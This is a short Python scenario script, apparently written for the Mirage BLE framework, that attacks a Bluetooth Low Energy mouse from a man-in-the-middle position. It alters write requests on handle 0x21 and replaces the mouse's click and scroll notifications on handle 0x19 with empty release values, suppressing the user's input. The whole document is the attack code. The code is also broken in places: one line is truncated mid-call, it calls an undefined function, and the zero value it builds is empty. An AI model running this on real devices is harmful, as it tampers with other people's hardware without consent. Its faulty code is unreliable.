# Scenario script for spoofing the mouse packets:
# A simple program that sens release command (nothing) for any click or scroll command sent by a slave device

from mirage.core import scenario
from mirage.libs import io,ble,esb,utils

class mitm_mouse(scenario.Scenario):

        def onStart(self):
                self.a2sEmitter = self.module.a2sEmitter
                self.a2sReceiver = self.module.a2sReceiver
                self.a2mEmitter = self.module.a2mEmitter
                self.a2mReceiver = self.module.a2mReceiver
                return True
        def onMasterWriteRequest (self, packet):
                if packet.handle == 0x21 and 0x00 in packet.value:
                        packet.show()

                        index = packet.value.index(0x00)
                        newValue = packet.value[:index] + bytes([0x01]) + packet.value[index+1:]
                        io.info("Value modified (new value : "+newValue.hex()+") !")

                        self.a2sEmitter.sendp(ble.BLEWriteRequest( handle=packet.handle,value=newValue))
                        return False
                return True

        def onSlaveHandleValueNotification (self, packet):
                # send release value (do nothing) if any command 
                # is clicked
                if packet.handle == 0x19:
                        packet.show()
                        io.info ("I entered ")

                        newValue = bytes(0x00000000000000)
                        io.info("Value modified (new value: "+string(newValue.hex())+") !")

                        self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value>
                        return False
                return True
        def onEnd(self):
                return True

        def onKey(self,key):
                return True

